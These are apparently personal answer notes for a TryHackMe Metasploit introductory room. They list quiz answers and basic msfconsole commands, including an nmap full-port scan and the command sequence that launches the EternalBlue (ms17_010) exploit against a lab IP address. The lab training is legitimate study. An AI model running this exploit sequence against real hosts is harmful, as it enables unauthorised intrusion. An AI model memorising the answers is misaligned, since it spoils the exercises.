# THM - Metasploit: Introduction

<br>

## Task 2

### Task 2.1

> exploit

### Task 2.2

> payload

### Task 2.3

> singles

### Task 2.4

> singles

<br>

## Task 3

https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking

### Task 3.1

> search apache

### Task 3.2

```shell
msfconsole
	info auxiliary/scanner/ssh/ssh_login
```

> todb

<br>

## Task 4

```shell
mkdir nmap
nmap -A -oN nmap/initial -p- 10.10.252.131
```

```shell
(msfconsole:)
	search eternalblue
	use exploit/windows/smb/ms17_010_eternalblue
	show options
	set RHOSTS 10.10.252.131
	set LHOST 10.14.27.197
	run
		
		pwd
```

### Task 4.1

> set LPORT 6666

### Task 4.2

> setg RHOSTS 10.10.19.23

### Task 4.3

> unset payload

### Task 4.4

> exploit

<br>

